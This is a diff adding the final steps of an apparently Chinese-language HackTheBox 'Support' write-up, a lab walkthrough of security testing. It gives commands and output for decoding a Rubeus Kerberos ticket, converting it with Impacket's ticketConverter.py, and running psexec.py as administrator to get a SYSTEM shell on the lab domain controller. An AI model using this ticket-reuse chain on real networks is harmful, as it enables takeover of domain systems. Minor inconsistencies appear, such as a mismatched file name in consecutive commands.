@@ -867,12 +867,56 @@ AuditFlags         : None
       MjAyNjAyMDIxNjAzNDFapxEYDzIwMjYwMjA5MDYwMzQxWqgNGwtTVVBQT1JULkhUQqkhMB+gAwIBAqEY
       MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
 [+] Ticket successfully imported!
-*Evil-WinRM* PS C:\Users\support\Documents> 
+*Evil-WinRM* PS C:\Users\support\Documents> exit
 
 ```
 #### Rubeus成功地弄到了票。现在，我们可以获取最后一个Base64编码的票证，并将其用于我们的以管理员身份在本地机器上获取DC上的shell。为此，复制最后一张票的值和将其粘贴到一个名为ticket.kirbi.b64的文件中。
+#### 转换的工具，但用不上
+https://www.browserling.com/tools/remove-all-whitespace  
 #### 注意：在将值粘贴到文件之前，请确保从值中删除任何空白字符。接下来，创建一个名为ticket的新文件。使用前一张彩票的Base64解码值
 ```
 [★]$ vi ticket.kirbi.b64
 [★]$ tr -d ' \n\r\t' < ticket.kirbi3.b64  > clean.b64
+[★]$ base64 -d clean.b64 > ticket.kirbi
+
+cat ticket.kirbi //看不了滴，但不影响票据转换
+```
+#### 最后，我们可以将此票据转换为Impacket可以使用的格式。这可以通过Impackets TicketConverter.py实现。
+https://github.com/fortra/impacket
+```
+[★]$ git clone https://github.com/fortra/impacket.git
+[★]$ ls impacket/examples/ticketConverter.py
+impacket/examples/ticketConverter.py  
+
+[★]$ ticketConverter.py ticket.kirbi ticket.ccache
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] converting kirbi to ccache...
+[+] done
+```
+#### 要获取shell，我们可以使用Impackets的psexec.py
+```
+[★]$ ls impacket/examples/psexec.py
+impacket/examples/psexec.py
+
+//这个环境变量KRB5CCNAME 它用来告诉系统：“Kerberos 的票据缓存（ccache 文件）在哪里”
+[★]$ KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on dc.support.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file vTSJFenZ.exe
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service pRZe on dc.support.htb.....
+[*] Starting service pRZe.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> type ..\..\Users\Administrator\Desktop\root.txt
+```
+
 
